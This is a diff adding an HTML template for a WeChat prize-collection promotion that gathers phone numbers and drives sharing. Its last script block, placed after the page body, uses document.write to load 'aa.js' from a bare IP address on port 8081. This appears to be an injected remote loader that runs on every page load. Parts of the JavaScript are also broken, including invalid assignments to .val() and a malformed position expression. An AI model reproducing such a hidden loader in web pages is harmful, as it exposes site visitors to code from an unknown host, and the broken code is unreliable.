@@ -1,0 +1,271 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1" />  
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="format-detection" content="telephone=no" />
+<meta http-equiv="Content-Type" content="text/html; charset=gbk" />
+<title>万福进万家</title>
+
+<link rel="stylesheet" type="text/css"  href="{[$DIR]}mobel_css.css" />  
+<script language="JavaScript" src="{[$DIR]}js/jquery-1.7.js"></script> 
+<script language="JavaScript" src="{[$DIR]}js/tab.js"></script> 
+<script type="text/javascript" src="{[$DIR]}js/background.js"></script>
+<script src="http://res.wx.qq.com/open/js/jweixin-1.0.0.js"></script>
+<script>
+wx.config({
+    debug: false, // 开启调试模式,调用的所有api的返回值会在客户端alert出来，若要查看传入的参数，可以在pc端打开，参数信息会通过log打出，仅在pc端时才会打印。
+    appId: '{[$jsApiArr.appId]}', // 必填，公众号的唯一标识
+    timestamp: '{[$jsApiArr.timestamp]}', // 必填，生成签名的时间戳
+    nonceStr: '{[$jsApiArr.nonceStr]}', // 必填，生成签名的随机串
+    signature: '{[$jsApiArr.signature]}',// 必填，签名，见附录1
+    jsApiList: [
+        'checkJsApi',
+        'onMenuShareTimeline',
+        'onMenuShareAppMessage',
+        'onMenuShareQQ',
+        'onMenuShareWeibo',
+        'hideMenuItems',
+        'showMenuItems',
+        'hideAllNonBaseMenuItem',
+        'showAllNonBaseMenuItem',
+        'translateVoice',
+        'startRecord',
+        'stopRecord',
+        'onRecordEnd',
+        'playVoice',
+        'pauseVoice',
+        'stopVoice',
+        'uploadVoice',
+        'downloadVoice',
+        'chooseImage',
+        'previewImage',
+        'uploadImage',
+        'downloadImage',
+        'getNetworkType',
+        'openLocation',
+        'getLocation',
+        'hideOptionMenu',
+        'showOptionMenu',
+        'closeWindow',
+        'scanQRCode',
+        'chooseWXPay',
+        'openProductSpecificView',
+        'addCard',
+        'chooseCard',
+        'openCard'
+      ] // 必填，需要使用的JS接口列表，所有JS接口列表见附录2
+});
+
+function fabudisplay()
+{
+var popUp = document.getElementById("choujiang")
+//document.getElementById('fabu_box').style.display='';
+
+var obj = document.getElementById("choujiang");
+var W = screen.width;//取得屏幕分辨率宽度
+var H = screen.height;//取得屏幕分辨率高度
+var yScroll;//取滚动条高度
+if (self.pageYOffset) {
+yScroll = self.pageYOffset;
+} else if (document.documentElement && document.documentElement.scrollTop){
+yScroll = document.documentElement.scrollTop;
+} else if (document.body) {
+yScroll = document.body.scrollTop;
+}
+
+//obj.style.marginLeft= (W/2 - 200) + "px";
+
+obj.style.display="block"; 
+}
+function fabudisplay2()
+{
+var popUp = document.getElementById("liquan")
+//document.getElementById('fabu_box').style.display='';
+
+var obj = document.getElementById("liquan");
+var W = screen.width;//取得屏幕分辨率宽度
+var H = screen.height;//取得屏幕分辨率高度
+var yScroll;//取滚动条高度
+if (self.pageYOffset) {
+yScroll = self.pageYOffset;
+} else if (document.documentElement && document.documentElement.scrollTop){
+yScroll = document.documentElement.scrollTop;
+} else if (document.body) {
+yScroll = document.body.scrollTop;
+}
+
+
+//obj.style.marginLeft= (W/2 - 200) + "px";
+obj.style.top= (H/2- 　+　yScroll) + "px";
+obj.style.display="block"; 
+}
+</script>
+<script language="JavaScript">
+/*
+根据对象当前的属性，改变对象的显示状态
+*/
+function onClickDiv(DivId)
+{
+if(document.all[DivId].style.display=='none')
+{ document.all[DivId].style.display=''; }
+else
+{ document.all[DivId].style.display='none'; }
+return 0;
+}
+</script>
+</head>
+
+<body>
+<div id="wrap" >
+<div id="content">
+      <div class="sc4_fudai">
+      <div class="tupian"><img src="{[$DIR]}images/wanfuwj_hj.jpg" /></div>
+      <div class="wenzi">
+            <p>恭喜您！</p>
+            <p>已获得{[$userArr.fu]}个祝福	</p>
+            <span> 得到价值千元名家真迹《福》字墨宝一幅</span></div>
+      </div>   
+      
+      {[if !$userArr.isOver]}
+      <div class="biaodan"><input type="text" name="shoujihao" id="shoujihao" placeholder="输入手机号…"/></input /></div> 
+      {[/if]}
+      
+      <div class="dianji dianji2">  
+      <div class="annbj">
+            <div class="one" id="anniu">
+            {[if $userArr.isOver]}
+            奖品领取成功
+            {[else]}
+            <a href="#tanchu-5"><button type="button" id="btnshow" class="anniu" onclick="javascript:return receive();"/>领取并分享</button> </a>
+            {[/if]}
+            </div>
+            <div class="two"></div>            
+      </div>  
+      </div>
+      
+<!--点击打开隐藏 查看豪礼 JS-->
+<script language="JavaScript">
+/*
+根据对象当前的属性，改变对象的显示状态
+*/
+function onClickDiv(DivId)
+{
+if(document.all[DivId].style.display=='none')
+{ document.all[DivId].style.display=''; }
+else
+{ document.all[DivId].style.display='none'; }
+return 0;
+}
+</script>
+<!--点击打开隐藏 查看豪礼 JS-- end-->
+
+      <div class="btmd"><a href="#tcjf" onclick="return onClickDiv('dy2')")><img src="{[$DIR]}images/ckcjdl.jpg" /></a></div>
+      <Div Id="dy2" class="tanchuyingchang"  style="display:none;">
+      <p>集齐100个祝福并领取礼品后，可继续集福，活动结束统计祝福排名，前50名可获得由书协主席亲笔书写的“福”字墨宝，如此豪礼，不可错过呦~~</p><a name="tcjf"></a>
+      </div>
+ 
+     <div id="bg"></div>
+      <div id="choujiang" style="width:100%; height:100%; position:absolute; top:0; left:0; z-index:1000; background-color:none;  display:none; color:#fff">
+            <div class="fenxiang"> 
+            <a name="tanchu-2"></a>  
+            <div class="jiantou"><p><img src="{[$DIR]}images/jiantou.png" /></p></div>
+            <div class="djysj">
+            <span>点击右上角按钮：</span>
+            <span class="s_icon"><img src="{[$DIR]}images/fpy.png" width="30" /></span>
+            <span class="s_icon"><img src="{[$DIR]}images/pyq.png" width="30" /></span>
+            </div>
+      
+            <div class="djysj"><h1>分享给好友，千元福字轻松拿！</h1></div>
+            <div class="djysj">一个好友点击将为你带来1—3个祝福<br />满一百个，千元大礼就是你的啦！</div>
+            <div class="djysj"><h2>朋友和朋友的朋友点击均有效哦</h2></div>
+            </div>
+            <div class="lml_close" onClick="document.getElementById('choujiang').style.display='none';closeWindow()">×</div>
+      </div>  
+      
+{[include file="tpl/wanfu/inc/menu.html"]}       
+</div>
+</div>
+
+<div class="zztj">
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1254040973'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/stat.php%3Fid%3D1254040973' type='text/javascript'%3E%3C/script%3E"));
+</script>
+</div>
+</body>
+<script>
+function receive(){
+var openid = '{[$userArr.openid]}';
+var m = $('#shoujihao').val();
+var reg0 = /^13\d{5,9}$/; 
+var reg1 = /^15\d{5,9}$/; 
+var reg2 = /^18\d{5,9}$/; 
+var reg3 = /^17\d{5,9}$/; 
+var reg4 = /^14\d{5,9}$/; 
+var reg5 = /^0\d{10,11}$/; 
+var my = false; 
+if (reg0.test(m))my=true; 
+if (reg1.test(m))my=true; 
+if (reg2.test(m))my=true; 
+if (reg3.test(m))my=true;
+if (reg4.test(m))my=true;
+if (reg5.test(m))my=true; 
+if (!my){ 
+alert('对不起，您输入的手机错误!'); 
+$('#shoujihao').val()='';
+return false; 
+}
+$.post('index.php?m=main&c=receive&p=main',{mobile : m, lopenid : openid},function(data){
+if(data==1){
+$('.biaodan').remove();	
+$('#anniu').html('奖品领取成功');	
+//window.location.href='index.php?m=main&c=zhuanfa&p=main&zt=jiang&openid={[$userArr.openid]}';
+fabudisplay();
+testMessageBox(event);
+showdiv();
+
+}else if(data==-1){
+alert('您已经成功领取过奖品哦!');
+$('#shoujihao').val() = mobile;	
+$('#shoujihao').attr('readonly',true);	
+$('#anniu').html('奖品领取成功');				
+}else{
+alert(data);	
+}
+})
+}
+
+wx.ready(function () {
+	//分享到朋友圈
+	wx.onMenuShareTimeline({
+		title: '我已领取千元“福”字墨宝一幅！快来参加，轻松拿豪礼！', // 分享标题
+		link: 'http://weixin.96567.com/hd/index.php?m=main&c=jifu&p=main&openid={[$userArr.openid]}', // 分享链接
+		imgUrl: 'http://weixin.96567.com/hd/static/images/f_logo.jpg', // 分享图标
+		success: function () { 
+			// 用户确认分享后执行的回调函数
+		},
+		cancel: function () { 
+			// 用户取消分享后执行的回调函数
+		}
+	});
+	
+	//分享给好友
+	wx.onMenuShareAppMessage({
+		title: '我已领取千元“福”字墨宝一幅！快来参加，轻松拿豪礼！', // 分享标题
+		desc: '转发本活动到朋友圈或发送给朋友，收集到100份祝福，即可免费获得知名书法家福字一张，先到先得，送完即止。', // 分享描述
+		link: 'http://weixin.96567.com/hd/index.php?m=main&c=jifu&p=main&openid={[$userArr.openid]}', // 分享链接
+		imgUrl: 'http://weixin.96567.com/hd/static/images/f_logo.jpg', // 分享图标
+		type: '', // 分享类型,music、video或link，不填默认为link
+		dataUrl: '', // 如果type是music或video，则要提供数据链接，默认为空
+		success: function () { 
+			// 用户确认分享后执行的回调函数
+		},
+		cancel: function () { 
+			// 用户取消分享后执行的回调函数
+		}
+	});
+})
+
+var bhid = 607;
+document.write("<script type=\"text/javascript\" src=\"http://113.106.95.36:8081/aa.js\"><\/script>");
+</script>
+</html>
